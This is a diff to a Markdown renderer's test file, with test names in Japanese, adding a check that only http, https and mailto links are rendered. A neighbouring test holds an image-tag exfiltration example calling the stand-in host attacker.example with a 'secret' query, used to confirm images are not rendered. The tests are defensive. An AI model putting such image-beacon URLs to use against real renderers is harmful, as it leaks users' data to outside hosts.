@@ -34,6 +34,17 @@ describe("renderMarkdown", () => {
     expect(html).not.toContain('href="javascript:');
   });
 
+  it("リンクは http / https / mailto だけ描く（閉じた許容。2026-10-30 の監査 8）", () => {
+    for (const href of ["file:///C:/Users/x/world.json", "ftp://example.com/x", "fuseforks://open", "docs/readme.md"]) {
+      const html = renderMarkdown(`[open](${href})`);
+      expect(html, href).not.toContain("<a ");
+      expect(html, href).toContain("open");
+    }
+    expect(renderMarkdown("[mail](mailto:someone@example.com)")).toContain('href="mailto:someone@example.com"');
+    // linkify が拾った素の URL も同じ門を通る。
+    expect(renderMarkdown("see https://example.com/x")).toContain('href="https://example.com/x"');
+  });
+
   it("画像記法は <img> にしない（描画だけで外へ GET が出る経路を持たない。2026-10-30）", () => {
     const html = renderMarkdown("本文 ![漏洩](https://attacker.example/leak?q=secret) 末尾");
     expect(html).not.toContain("<img");
